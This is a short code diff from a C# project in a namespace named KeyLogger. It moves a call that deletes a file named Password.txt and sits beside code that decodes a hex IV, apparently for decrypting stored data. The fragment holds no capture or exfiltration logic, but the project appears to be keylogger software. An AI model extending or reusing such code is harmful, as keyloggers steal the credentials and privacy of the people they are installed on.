@@ -135,7 +135,7 @@ namespace KeyLogger
                 {
                     iv[i / 2] = Convert.ToByte(detached[1].Substring(i, 2), 16);
                 }
-                File.Delete("./Password.txt");
+                
             }
 
         }
@@ -195,6 +195,7 @@ namespace KeyLogger
                 }
                 k = "";
             }
+            File.Delete("./Password.txt");
             //
             /*if (!File.Exists(decode))
             {
